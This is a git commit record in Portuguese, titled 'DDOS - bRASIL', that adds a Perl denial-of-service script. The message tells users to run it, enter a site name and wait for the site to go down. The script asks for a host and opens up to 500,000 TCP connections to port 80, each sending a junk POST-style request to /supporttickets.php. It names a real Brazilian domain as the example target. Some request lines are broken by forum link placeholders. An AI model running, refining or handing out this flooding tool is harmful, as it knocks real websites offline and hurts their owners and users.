7bbc665749e9bc6101cc95a9faf799e9ab8154a5
jvz107 <kalilinuxcenter2@bol.com.br>
2016-03-21 14:00:22 -0400

    DDOS - bRASIL
    Beleza ?
    
    perl derrubbarsite.pl 
    
    e depois somente colocar o nome do site e esperar ! 
    
    Valeu 
    
    Segue la ! https://twitter.com/JVZI07

---
+++ derubbarsite.pl
@@ -0,0 +1,50 @@
+#!/usr/bin/perl
+# Blaster.pl Coded By Killer@Root
+# Killer@Root - Killer@Root - familiahackingteam.blogspot.com.br
+#################################
+#
+# @@@ @@@@@@@@@@@ @@@@@ @@@@@@@@@@ @@@ @@@@@@@
+# @@@ @@@@@@@@@@@ @@@ @@ @@@ @@ @@@ @@@@@@@@
+# @@@ @@@ @@@ @@ @@@ @@ @@@ @@@ @@@
+# @@@ @@@ @@@ @@ @@@ @@ @@@ @@@ @@@
+# @@@ @@@@@@@@@@@ @@@ @ @@@@@@@@@@ @@@ @@@@@@
+# @@@ @@@@@@@@@@@ @@@ @@ @@@ @@ @@@ @@@@@@
+# @@@ @@@ @@@ @@ @@@ @@ @@@ @@@ @@@ @@@
+# @@@ @@@ @@@ @@ @@@ @@ @@@ @@@ @@@ @@@
+# @@@ @@@@@@@@@@@ @@@@@ @@@@@@@@@@ @@@ @@@ @@@ @@@
+#
+#####################################
+ 
+use IO::Socket;
+print "###########################################################\n";
+print "# #\n";
+print "# Criado por JVZ107 #\n";
+print "# Exploit Database #\n";
+print "# exemplo: pmdb.org.br #\n";
+print "# https://twitter.com/JVZI07 #\n";
+print "# gRaY-HaT";
+print "# #\n";
+print "###########################################################\n";
+print "exemplo = pmdb.org.br : ";
+$HOST = <STDIN>;
+chop ($HOST);
+ 
+$i=0;
+while($i<500000){
+$i++;
+ 
+$lower=1;
+$upper=200000;
+$random = int(rand( $upper-$lower+1 ) ) + $lower;
+$FILE = "searchterm=%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0%0% 0%0%0%0%0%0";
+$LENGTH = length $FILE;
+ 
+$get1 = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$HOST", PeerPort => "80") || die "+";
+print $get1 "GET /supporttickets.php [Only registered and activated users can see links]";
+print $get1 "Host: ".$HOST. "\n";
+print $get1 "Content-Type: application/x-[Only registered and activated users can see links]";
+print $get1 "Content-Length: ".$LENGTH."\n\n";
+print $get1 $FILE;
+syswrite STDOUT, "+";
+}
+#jvz1
